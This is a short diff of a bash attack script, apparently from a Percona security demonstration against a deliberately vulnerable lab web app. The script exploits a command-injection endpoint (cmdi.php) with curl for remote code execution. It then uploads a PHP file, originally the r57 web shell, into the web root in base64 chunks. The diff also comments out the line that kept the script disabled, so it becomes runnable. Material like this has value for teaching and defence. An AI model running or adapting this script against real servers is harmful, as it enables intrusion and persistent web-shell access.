@@ -7,8 +7,8 @@
 # Copyright 2013 Percona LLC / David Busby
 #
 
-echo "RUH RO, I'm disabled!" && exit 1;
-
+#echo "RUH RO, I'm disabled!" && exit 1;
+if [ ! -f "images.php" ]; then echo "images.php missing, exiting" && exit 1; fi
 vuln_webapp="http://172.16.33.2/vuln_webapp"
 #get the PWD (webdir) we're running in
 echo "Phase 1 - Information gathering"
@@ -25,7 +25,7 @@ cmd="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$cmd")"
 #now using curl we execute the command agains the known vulnerable script (RCE - Remote Code Execution)
 curl -s "$vuln_webapp/cmdi.php?cmd=$cmd" > /dev/null
 #Now we're going to use the base64 binary to split the payload into smaller parts
-base64 -w 100 r57.php | while read chunk
+base64 -w 100 images.php | while read chunk
 do
     (( i++ ))
     chunk_inject="echo -n '$chunk' >> $webdir/images.b64"
